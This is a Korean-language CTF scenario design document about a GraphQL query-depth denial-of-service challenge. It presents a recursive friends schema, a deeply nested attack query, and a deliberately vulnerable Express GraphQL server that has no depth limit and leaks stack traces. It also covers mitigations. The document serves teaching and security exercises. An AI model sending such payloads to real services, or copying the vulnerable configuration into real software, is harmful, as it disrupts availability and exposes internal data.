---
title: GraphQL Query Depth Limit Bypass DoS — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, graphql, dos, query-depth, database-exhaustion, logical-vulnerability]
confidence: high
---

# GraphQL Query Depth Limit Bypass DoS — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Social Network Explorer (인간 관계 탐색기)
- **난이도**: Medium-High
- **핵심 컨셉**: GraphQL API 스펙상 제공되는 객체 간 재귀 순환 관계 조회를 악용하여 백엔드 및 데이터베이스 리소스를 완전히 고갈시키는 **GraphQL 질의 깊이(Query Depth) DoS** 취약점 문제입니다. 대상 애플리케이션은 사용자(User)와 친구(Friend) 간의 다대다(N:M) 관계 정보를 제공하는 GraphQL API 서비스입니다. 백엔드 서비스 구축 시, 외부 클라이언트가 전송할 수 있는 쿼리의 복잡도(Complexity) 및 깊이(Depth) 한도에 대한 통제 미들웨어를 구축하지 않았습니다. 공격자는 객체가 서로를 무한히 재귀 참조하는 극단적인 깊이의 쿼리(Nested Query)를 정교하게 작성하여 전송함으로써, DB 내부의 엄청난 조인(Join) 연산 과부하를 강제하고 최종적으로 서비스 전체의 연결 풀(Connection Pool)을 고갈시켜 가용성을 심각하게 침해합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **GraphQL Endpoint (`/graphql`)**:
  - 사용자 정보 조회 스키마를 탑재한 엔드포인트.
  - `User` 타입 정의 시, 자신의 친구 목록을 조회하기 위해 `friends` 필드가 정의되어 있고 이 필드는 다시 `User` 타입을 순환 참조합니다.
- **Flag 위치**:
  - 서비스 거부(DoS) 임계점 공격을 수행하여 백엔드 DB의 예외적 오류(Exception)를 유발하거나, 혹은 DoS 복구 후 관리자 모듈에서 숨겨진 플래그를 취득하게 만드는 다단계 설계 가능. 여기서는 DoS 유발로 인해 서버 커넥션 풀이 끊어지며 반환되는 스택 트레이스 내부 정보 혹은 서비스 오류 메시지 내에서 플래그를 획득하는 문제 구조를 상정합니다.

### 2.2 취약점 지점
1. **Lack of Query Depth Limiting (질의 깊이 제한 부재)**:
   - GraphQL 엔진 설정 시 `graphql-depth-limit` 같은 유효성 검증 규칙(Validation Rules)이 활성화되어 있지 않습니다.
   - 따라서 수십 단계의 중첩 쿼리(Nested Query)를 입력받아 그대로 실행 연산으로 변환합니다.
2. **Recursive Database ORM Resolvers**:
   - 리졸버(Resolver) 함수가 N+1 문제 해결 없이 순차적으로 데이터를 fetch하여 대량의 중첩 SQL을 지속해서 DB에 투입함으로써 가용성을 무력화합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 요청 바디 포맷 | 핵심 속성 |
|------------|--------|------|----------------|-----------|
| `/graphql` | POST | 불필요 | JSON | `query { user { friends { friends { ... } } } }` |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 스키마 순환 구조 탐색
공격자는 인트로스펙션(Introspection) 질의 또는 애플리케이션 기능을 통해 `User` 오브젝트 내부에 자기 자신을 리턴하는 순환 필드가 존재함을 파악합니다.
- **GraphQL Schema 구조 예시**:
  ```graphql
  type User {
    id: ID!
    username: String!
    friends: [User!]!
  }
  ```

### Step 2. 순환 중첩 쿼리(Nested Query) 페이로드 제작
친구 관계가 서로 엮여 있으므로, `friends`를 지속적으로 하위 호출하여 트리(Tree)형태의 지수적 복잡성을 유도할 수 있는 대량의 쿼리를 구성합니다.
- **Nested Query 예시**:
  ```graphql
  query attack {
    user(id: "1") {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        friends {
                          friends {
                            friends {
                              username
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  ```
  *(수백 단계를 중첩하여 백엔드의 메모리 초과 또는 DB 커넥션 병목을 트리거함)*

### Step 3. DoS 공격 실행 및 에러 모니터링
1. 작성한 중첩 쿼리를 `/graphql` 엔드포인트로 전송합니다.
2. 백엔드 서버는 쿼리를 해석하기 위해 구문 분석 트리(AST)를 거대하게 메모리에 로드하고, 리졸버는 각 단계마다 루프를 돌며 DB SQL을 동적으로 밀어 넣습니다.
3. 데이터베이스는 순식간에 CPU 점유율 100%에 도달하고, 다른 요청에 응답할 수 없는 서비스 거부 상태가 됩니다.
4. 이때 서버 설정 오류로 인해 커넥션 타임아웃 예외 스택 트레이스(Database Connection Pool Timeout Stacktrace)가 클라이언트에 날것으로 반환되거나, 혹은 DoS 복구를 위한 응답 헤더 내 디버그 정보에 플래그가 담겨 노출됩니다.

### Step 4. flag 획득
1. 쿼리 전송 후 반환된 에러 응답 객체를 파싱합니다.
2. 에러 응답 내의 `extensions.debug` 또는 Stack Trace에서 시스템 환경 및 기밀 덤프 데이터를 읽어내어 최종 플래그(`FLAG{graphql_recursive_depth_unlimited_dos_exhaustion}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express + GraphQL)

```javascript
// server.js (취약한 GraphQL 설정 서버 예시)
const express = require('express');
const { graphqlHTTP } = require('express-graphql');
const { buildSchema } = require('graphql');
const app = express();

// 취약점 지점 1: 순환 참조를 허용하는 GraphQL 스키마 정의
const schema = buildSchema(`
  type User {
    id: ID!
    username: String!
    friends: [User]
  }

  type Query {
    user(id: ID!): User
  }
`);

// 모킹 데이터베이스 해석기
const root = {
    user: ({ id }) => {
        // 데이터베이스의 무거운 Join 연산을 모방
        return {
            id: id,
            username: `User_${id}`,
            friends: async () => {
                // 매 단계 조회 시 지연 및 무거운 자원 호출을 동반함
                return [
                    { id: "2", username: "User_2" },
                    { id: "3", username: "User_3" }
                ];
            }
        };
    }
};

// 취약점 지점 2: validationRules가 적용되지 않아 쿼리의 depth를 사전에 측정/차단하지 않음
app.use('/graphql', graphqlHTTP({
    schema: schema,
    rootValue: root,
    graphiql: true,
    // validationRules: [depthLimit(10)] <- 이것이 설정되어 있지 않음
    customFormatErrorFn: (err) => {
        // 취약점 지점 3: 상세한 예외/디버그 데이터를 응답에 그대로 노출
        return {
            message: err.message,
            locations: err.locations,
            stack: err.stack, // 내부 flag 노출 근원: FLAG{graphql_recursive_depth_unlimited_dos_exhaustion}
            path: err.path
        };
    }
}));

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **질의 깊이 한도 설정 (Query Depth Limiting)**:
   - `graphql-depth-limit` 라이브러리 등을 사용하여 GraphQL 요청 검증 파이프라인에 최대 깊이 한계 규칙을 삽입합니다. 통상 5~10단계 이상의 중첩 조리는 API 분석 단계에서 즉각 거절되도록 통제합니다.
     ```javascript
     const depthLimit = require('graphql-depth-limit');
     app.use('/graphql', graphqlHTTP({
         schema: schema,
         validationRules: [ depthLimit(5) ] // 5단계 이상 중첩 시 Error 반환
     }));
     ```
2. **쿼리 복잡도 계산 분석 (Query Complexity Analysis)**:
   - 단순 노드 깊이가 낮더라도 과도한 연산을 불러올 수 있는 구조를 제어하기 위해, 각 필드마다 가중치를 부여하고 한 번의 요청에 청구될 수 있는 총 복잡도(Complexity Cost) 상한선(Rate Limit)을 적용합니다.
3. **리졸버 일괄 처리 최적화 (DataLoader 도입)**:
   - 데이터베이스 리졸버 호출 시 DataLoader 패턴을 사용하여 N+1 쿼리 생성을 억제하고 데이터베이스 조회를 배치(Batch)화하여 데이터베이스 리소스 과부하를 원천 방지합니다.
